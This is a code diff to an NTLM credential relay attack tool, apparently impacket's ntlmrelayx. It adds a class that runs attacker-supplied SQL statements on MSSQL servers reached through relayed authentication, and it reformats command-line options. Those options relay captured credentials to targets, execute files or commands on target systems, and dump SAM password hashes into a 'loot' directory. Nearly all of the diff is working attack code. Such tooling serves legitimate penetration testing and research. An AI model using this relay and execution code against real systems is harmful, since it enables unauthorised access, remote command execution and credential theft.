@@ -219,25 +219,48 @@ class HTTPAttack(Thread):
         with open(os.path.join(self.config.lootdir,fileName),'w') as of:
             of.write(self.client.lastresult)
 
+class MSSQLAttack(Thread):
+    def __init__(self, config, MSSQLClient, command):
+        Thread.__init__(self)
+        self.config = config
+        self.client = MSSQLClient
+        self.command = command
+
+    def run(self):
+        logging.info('Executing SQL: %s' % self.command)
+        self.client.sql_query(self.command)
+        self.client.printReplies()
+        self.client.printRows()
+
 # Process command-line arguments.
 if __name__ == '__main__':
 
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
-    ATTACKS = { 'SMB': SMBAttack, 'LDAP': LDAPAttack, 'HTTP': HTTPAttack }
+    ATTACKS = { 'SMB': SMBAttack, 'LDAP': LDAPAttack, 'HTTP': HTTPAttack, 'MSSQL': MSSQLAttack }
     # Init the example's logger theme
     logger.init()
     print version.BANNER
-    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to relay that connection to specified target(s) system or the original client")
+    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
+                                    "try to relay that connection to specified target(s) system or the original client")
     parser.add_argument("-h","--help", action="help", help='show this help message and exit')
-    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help='Target to relay the credentials to, can be an IP, hostname or URL like smb://server:445 If unspecified, it will relay back to the client')
-    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or full URL, one per line')
-    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list automatically (only valid with -tf)')
+    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help='Target to relay the credentials to, '
+                  'can be an IP, hostname or URL like smb://server:445 If unspecified, it will relay back to the client')
+    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
+                                                                             'full URL, one per line')
+    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
+                                                        'automatically (only valid with -tf)')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
-    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
-    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
-    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR', help='Loot directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
-    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
-    parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
+    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
+                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
+                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
+                                                          'directory). When targeting MSSQL, specify a SQL statement')
+    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR', help='Loot '
+                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
+    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
+                                                                   'will be added for ntlm and ntlmv2')
+    parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when '
+                        'interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
 
